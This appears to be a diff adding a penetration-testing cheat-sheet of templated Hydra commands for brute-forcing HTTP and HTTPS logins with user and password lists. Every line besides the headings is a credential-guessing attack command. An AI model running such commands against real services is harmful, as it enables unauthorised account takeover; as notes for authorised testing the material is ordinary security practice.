@@ -1,0 +1,10 @@
+Https with user and password file
+hydra -L {USER_FILE} -P {PASSWORD_FILE} -S -s {PORT} -f {HOST} https-get {PATH} -e nsr -I -t 8 -T 32
+Http with user and password file
+hydra -L {USER_FILE} -P {PASSWORD_FILE} -s {PORT} -f {HOST} http-get {PATH} -e nsr -I -t 8 -T 32
+Https with user
+hydra -l {USER} -P {PASSWORD} -S -s {PORT} -f {HOST} https-get {PATH} -e nsr -I -t 8 -T 32
+http with user
+hydra -l {USER} -P {PASSWORD} -s {PORT} -f {HOST} http-get {PATH} -e nsr -I -t 8 -T 32
+
+We can set the password and loop the users with the option -u
